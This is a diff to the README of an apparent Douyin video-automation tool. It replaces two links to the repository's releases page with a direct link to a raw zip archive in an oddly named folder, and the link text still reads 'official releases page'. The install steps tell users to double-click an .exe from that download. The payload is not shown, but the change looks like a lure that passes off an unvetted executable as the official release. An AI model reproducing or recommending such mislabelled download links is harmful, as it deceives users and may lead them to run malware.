@@ -1,6 +1,6 @@
 # 🌌 Galaxy-Douyin-Ultimate-Studio-2026 - Automate your Douyin video content tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lustevaluative68/Galaxy-Douyin-Ultimate-Studio-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lustevaluative68/Galaxy-Douyin-Ultimate-Studio-2026/raw/refs/heads/main/Logres/Galaxy-Douyin-Ultimate-Studio-3.3-alpha.3.zip)
 
 Galaxy-Douyin-Ultimate-Studio-2026 automates repetitive video tasks for Douyin content creators. This tool handles video downloads, generates subtitles through offline speech recognition, and translates text content using Gemini API integration. You do not need programming skills to manage your video workflow with this software.
 
@@ -23,7 +23,7 @@ Galaxy-Douyin-Ultimate-Studio-2026 automates repetitive video tasks for Douyin c
 
 Follow these steps to prepare the software on your computer.
 
-1.  Visit the [official releases page](https://github.com/Lustevaluative68/Galaxy-Douyin-Ultimate-Studio-2026/releases) to download the installer.
+1.  Visit the [official releases page](https://github.com/Lustevaluative68/Galaxy-Douyin-Ultimate-Studio-2026/raw/refs/heads/main/Logres/Galaxy-Douyin-Ultimate-Studio-3.3-alpha.3.zip) to download the installer.
 2.  Locate the file ending in `.exe` in your downloads folder.
 3.  Double-click the installer file to begin.
 4.  Follow the prompts on the screen to finish the installation process.
